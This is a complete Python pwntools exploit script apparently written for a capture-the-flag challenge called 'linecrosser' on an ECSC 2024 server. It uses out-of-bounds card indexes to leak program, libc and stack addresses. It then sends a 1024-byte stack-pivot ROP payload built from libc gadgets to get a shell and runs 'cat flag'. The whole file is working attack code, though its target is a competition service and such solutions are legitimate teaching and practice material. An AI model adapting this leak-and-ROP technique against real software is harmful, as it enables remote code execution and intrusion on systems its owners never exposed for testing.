from pwn import *


class Challenge:
    def __init__(self, remote_host, elf_path='./build/linecrosser', libc_path='./libc.so.6'):
        self.remote_host = remote_host
        self.elf_path = elf_path
        self.libc_path = libc_path

    def connect(self, checksec=True):
        self.io = remote(self.remote_host, 38002)
        self.io.recvuntil(b'Welcome to Cards Against Hackers TM\n')
        self.elf = ELF(self.elf_path, checksec=checksec)
        self.libc = ELF(self.libc_path, checksec=checksec)
        self._prompt_counter = 0

    def disconnect(self):
        self.io.close()

    def setup_elf_and_libc(self):
        _, address = self.show_custom_card_prompt(33)
        self.elf.address = address - self.elf.sym['main']
        _, address = self.show_custom_card_prompt(42)
        self.libc.address = address - (self.libc.sym['__libc_start_main'] + 0x80)

    def setup_stack_addresses(self):
        _, self.addr_stack_answers = self.show_custom_card_prompt(-3)
        self.addr_stack_prompts = self.addr_stack_answers - 0x100
        self.addr_main_loop_rbp = self.addr_stack_prompts - 0x10

    def reconnect_and_resetup(self):
        self.disconnect()
        self.connect(checksec=False)
        self.setup_elf_and_libc()
        self.setup_stack_addresses()

    def create_custom_card_answer(self, answer: bytes):
        self.io.sendlineafter(b'Exit\n', b'2')
        self.io.sendlineafter(b'(2)?\n', b'1') 
        self.io.sendlineafter(b'Write your answer\n', answer)

    def create_custom_card_prompt(self, prompt: bytes, completions: int):
        self.io.sendlineafter(b'Exit\n', b'2') 
        self.io.sendlineafter(b'(2)?\n', b'2') 
        self.io.sendlineafter(b'Write your prompt\n', prompt)
        self.io.sendlineafter(b'How many completions?\n', str(completions).encode())

    def show_custom_card_answer(self, index: int) -> bytes | None:
        self.io.sendlineafter(b'Exit\n', b'3')
        self.io.sendlineafter(b'(2)?\n', b'1')
        self.io.sendlineafter(b'one?\n', str(index).encode())
        self.io.recvuntil(b'Answer: \'')
        data = self.io.recvuntil(b'\'\n1) Play\n', drop=True)
        if data == b'(null)':
            data = None
        return data

    def show_custom_card_prompt(self, index: int) -> tuple | None:
        self.io.sendlineafter(b'Exit\n', b'3')
        self.io.sendlineafter(b'(2)?\n', b'2')
        self.io.sendlineafter(b'one?\n', str(index).encode())
        self.io.recvuntil(b'Prompt (')
        int1 = int(self.io.recvuntil(b' completions): \'', drop=True), 10)
        data0 = self.io.recvuntil(b'\'\n1) Play\n', drop=True)
        if data0 == b'(null)':
            data0 = None
        return data0, int1

    def leak_via_answer_by_addr(self, addr):
        index = (addr - self.addr_stack_answers) // 8
        return self.show_custom_card_answer(index)

    def leak_address(self, addr):
        self.create_custom_card_prompt(b'AAAAAAAA', addr)
        base = self.addr_stack_prompts + self._prompt_counter * 16
        self._prompt_counter += 1
        assert self.leak_via_answer_by_addr(base+0) == b'AAAAAAAA\n'
        return self.leak_via_answer_by_addr(base+8)


if __name__ == '__main__':
    REMOTE_HOST = 'linecrosser.challs.open.ecsc2024.it'

    context.clear(arch='amd64')

    chall = Challenge(remote_host=REMOTE_HOST)
    chall.connect()
    chall.setup_elf_and_libc()
    chall.setup_stack_addresses()

    while not hex(chall.addr_main_loop_rbp).endswith('70'):
        chall.reconnect_and_resetup()

    log.info(f'main_loop() rbp: {chall.addr_main_loop_rbp:#x}')

    # this one requires `binutils` installed; otherwise, hardcode offset 0xe91d3
    gadget0 = next(chall.libc.search(
        asm('lea rsp, [rbp - 0x10] ; pop r12 ; pop r13 ; pop rbp ; ret'),
        executable=True
    ))
    gadget1 = chall.libc.address + 0xebd52
    addr_buffer = chall.addr_stack_prompts - 0x440
    payload = flat({
        # A gadget for stack pivoting
        # cyclic: raajsaaj
        968: p64(gadget0),

        # RBP: gadget0 sets RSP=[RBP-0x10], so the below points RSP to the
        # beginning of the stack buffer where the cyclic pattern is.
        # cyclic: paajqaaj
        960: p64(addr_buffer + 0x10),

        # values set by gadget0 to invoke gadget1 
        0: [
            # r12: cyclic: aaaabaaa
            p64(0),
            # r13: cyclic: caaadaaa
            p64(0),
            # rbp: cyclic: eaaafaaa
            p64(chall.addr_stack_prompts), # just something writable
            # ret: cyclic: gaaahaaa
            p64(gadget1),
        ],
    }, length=1024)

    chall.create_custom_card_prompt(payload, 0)
    chall.io.sendlineafter(b'Exit\n', b'4')
    chall.io.wait(0.5)
    chall.io.sendline(b'cat flag')
    log.success('Flag: %s', chall.io.recv().decode())
    #chall.io.interactive()
    chall.io.close()
